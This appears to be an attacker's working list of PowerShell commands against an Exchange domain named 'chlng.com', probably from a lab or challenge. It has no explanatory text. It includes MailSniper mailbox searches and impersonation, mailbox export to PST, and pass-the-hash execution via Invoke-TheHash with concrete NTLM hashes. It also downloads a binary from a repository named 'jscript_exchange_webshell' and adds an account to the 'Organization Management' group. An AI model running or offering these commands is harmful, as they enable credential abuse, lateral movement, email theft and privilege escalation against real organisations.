Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-GlobalMailSearch -ImpersonationAccount \'chlng-pdc-01.CHLNG.com\\Administrator\' -ExchHostname \'chlng-wks-1\' -OutputCsv \'C:\\ProgramData\\global-email-search.csv\';
Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-SelfSearch -Mailbox HealthMailbox44abe0d@CHLNG.com -OtherUserMailbox; 
Import-Module C:\\ProgramData\\pview.ps1; Get-NetUser | Sort-Object mail | ForEach-Object {$_.mail} | Out-File -Encoding ascii C:\\ProgramData\\emaillist.txt;

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2016; . $env:ExchangeInstallPath\\bin\\RemoteExchange.ps1; Connect-ExchangeServer -auto; Get-Help Get-Mailbox;

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-MailboxExportRequest
powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; New-MailboxExportRequest -Mailbox \'chong@chlng.com\' -FilePath \'\\\\chlng.com\\C$\\ProgramData\\test.pst\';

powershell [void] [System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [void] [System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.VisualBasic\'); [Microsoft.VisualBasic.Interaction]::AppActivate(4404); [System.Windows.Forms.SendKeys]::SendWait(\'~\');

[Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\' ; Invoke-WebRequest -Uri \'Http:\\\\chlng.com\' -OutFile \'C:\\ProgramData\\test.html\'

Expand-Archive

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Action List -Source \'\\\\chlng.com\\C$\' -verbose


Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBEnum -Target \'chlng.com\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -verbose  

Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'chlng.com\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'f348587cfb111bb717f4faaa8269d059\' -Command \'whoami\' -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'chlng.com\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9 -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Command \'whoami\' -verbose

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Command \'whoami\' -verbose 


powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username Administrator -Hash \'f4b7d0e81f8c34891bf125cba42eb48f\' -Command \'whoami\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Action List -Source \'\\\\chlng.com\\SYSVOL\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'localhost\' -Username Administrator -Hash \'60ba4fcadc466c7a033c178194c03df6\' -Command \'cmd /c dir C:\\ ^> C:\\ProgramData\\output20.txt\ 2>&1' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Command \'' -verbose

powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/OreNPluS1/jscript_exchange_webshell/raw/main/TeamViewerQS_personal.exe\' -OutFile C:\\ProgramData\\TeamViewerQS_personal.exe 

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-RoleGroupMember \'Organization Management\' -Member HealthMailbox88fa07b

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-RoleGroupMember \'Organization Management\'